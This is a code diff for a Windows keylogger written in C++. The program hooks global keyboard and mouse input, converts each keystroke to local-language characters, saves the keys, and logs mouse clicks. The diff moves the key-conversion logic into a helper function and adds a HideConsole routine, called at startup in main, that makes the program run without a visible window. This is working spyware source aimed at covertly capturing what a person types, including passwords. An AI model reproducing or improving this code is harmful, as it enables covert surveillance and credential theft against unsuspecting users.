@@ -26,6 +26,54 @@ void SaveKey(const char* key)
 
 
 
+// Convert code to  Local language char --------------------------------------------------------------
+void ConvertToLocalLanguageChar(KBDLLHOOKSTRUCT  kbdStruct)
+{
+    unsigned char keyboardState[256];
+    for (int i = 0; i < 256; ++i)
+        keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
+
+    wchar_t wbuffer[3] = { 0 };
+
+    // Convert to Unicode // Multi Language characters 
+    int result = ToUnicodeEx(
+        kbdStruct.vkCode,
+        kbdStruct.scanCode,
+        keyboardState,
+        wbuffer,
+        sizeof(wbuffer) / sizeof(wchar_t), 0,
+        GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
+
+    // If sucessfully converted
+    if (result > 0)
+    {
+        char buffer[5] = { 0 };
+        WideCharToMultiByte(CP_UTF8, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
+        SaveKey(buffer); // Save the Key
+    }
+}
+
+
+
+
+
+
+
+
+ // Hide console ------------------------------------------------------------------------------------
+void HideConsole()
+{
+	// Handle to a window - part of win32 api
+	HWND handle;
+	AllocConsole();	 // Initializes standard input, standard output, and standard error handles for the new console
+	handle = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(handle, 0);
+}
+
+
+
+
+
 KBDLLHOOKSTRUCT  kbdStruct;
  
  
@@ -38,9 +86,11 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
         //PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
         kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);    //  // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.  
 
-          
+
+         // If valid keyboard code 
         if (kbdStruct.vkCode != 0)
         {
+               // If Key is pressed
                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                {
                    //switch (p->vkCode) {
@@ -88,40 +138,17 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
                         
                          // Ordinary keys / Visible keys
                         default:
-                      
-                            unsigned char keyboardState[256];
-                       for (int i = 0; i < 256; ++i)
-                           keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
-            
-                       wchar_t wbuffer[3] = { 0 };
-            
-                       // Convert to Unicode // Multi Language characters 
-                       int result = ToUnicodeEx(
-                           kbdStruct.vkCode,
-                           kbdStruct.scanCode,
-                           keyboardState,
-                           wbuffer,
-                           sizeof(wbuffer) / sizeof(wchar_t),
-                           0,
-                           GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
-                     
-                       // If sucessfully converted
-                       if (result > 0)
-                       {
-                           char buffer[5] = { 0 };
-                           WideCharToMultiByte(CP_UTF8, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
-                           SaveKey(buffer); // Save the Key
-                       }
+                            ConvertToLocalLanguageChar(kbdStruct); // Convert to local language char
                    }
                }
-               else
+               else   // Mouse Actions
                {
                    switch (wParam)
                    {
-                   case WM_LBUTTONDOWN: SaveKey("<L_MOUSE>"); break;
-                   case WM_RBUTTONDOWN: SaveKey("<R_MOUSE>"); break;
-                   case WM_MBUTTONDOWN: SaveKey("<M_MOUSE>"); break;
-                   case WM_MOUSEWHEEL: SaveKey("<MOUSE_WHEEL>"); break;
+                        case WM_LBUTTONDOWN: SaveKey("<L_MOUSE>"); break;
+                        case WM_RBUTTONDOWN: SaveKey("<R_MOUSE>"); break;
+                        case WM_MBUTTONDOWN: SaveKey("<M_MOUSE>"); break;
+                        case WM_MOUSEWHEEL: SaveKey("<MOUSE_WHEEL>"); break;
 
                    default:
                        break;
@@ -130,7 +157,7 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
         }
        
     }
-    return CallNextHookEx(keyboard_hHock, nCode, wParam, lParam);
+    return CallNextHookEx(keyboard_hHock, nCode, wParam, lParam);  // Call the next hook so we get the next
 }
 
 
@@ -142,6 +169,9 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
 // MAIN -------------------------------------------------------------------------------------------------
 int main()
 {
+    // Hide Console
+    HideConsole();
+
     MSG msg;
     keyboard_hHock = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelHook, NULL, NULL);   // The hook (keyboard hook)
     mouse_hHock = SetWindowsHookEx(WH_MOUSE_LL, LowLevelHook, NULL, NULL);   // The hook (Mouse hook)
